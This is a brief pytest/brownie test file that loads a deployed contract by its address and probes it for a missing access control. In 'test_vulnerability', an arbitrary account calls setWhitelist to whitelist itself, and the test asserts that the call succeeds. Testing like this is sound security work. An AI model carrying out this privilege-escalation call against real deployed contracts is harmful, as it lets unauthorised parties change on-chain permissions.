import pytest
from brownie import Contract

@pytest.fixture

def alchemist():
    yield Contract.from_explorer("0x6B566554378477490ab040f6F757171c967D03ab")

def testing_whitelist(alchemist, accounts):
    test = alchemist.whitelist(accounts[0], {"from": accounts[0]})
    assert test == False
def test_vulnerability(alchemist, accounts):
    alchemist.setWhitelist([accounts[0]], [True], {"from":accounts[0]})
    check = alchemist.whitelist(accounts[0], {"from":accounts[0]})
    assert check == True
